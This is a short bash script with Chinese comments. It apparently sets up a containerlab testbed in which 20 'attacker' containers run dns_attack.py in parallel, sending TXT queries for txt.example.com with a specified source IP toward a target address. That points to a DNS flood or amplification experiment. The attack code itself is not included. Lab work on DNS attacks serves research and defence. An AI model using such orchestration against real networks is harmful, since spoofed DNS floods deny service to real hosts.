#!/bin/bash

# 20个攻击节点在后台运行攻击脚本

seq 1 20 | parallel -j 50 "docker exec -d clab-dns-attack-attacker_{} python3 /usr/local/bin/dns_attack.py txt.example.com TXT 192.168.0.2 192.168.2.1"

# dns_attack.py arg1 arg2 arg3 arg4
# arg1: 查询的域名
# arg2: 查询类型 (A, AAAA, NS, ANY....)
# arg3: 源ip
# arg4: 目的ip
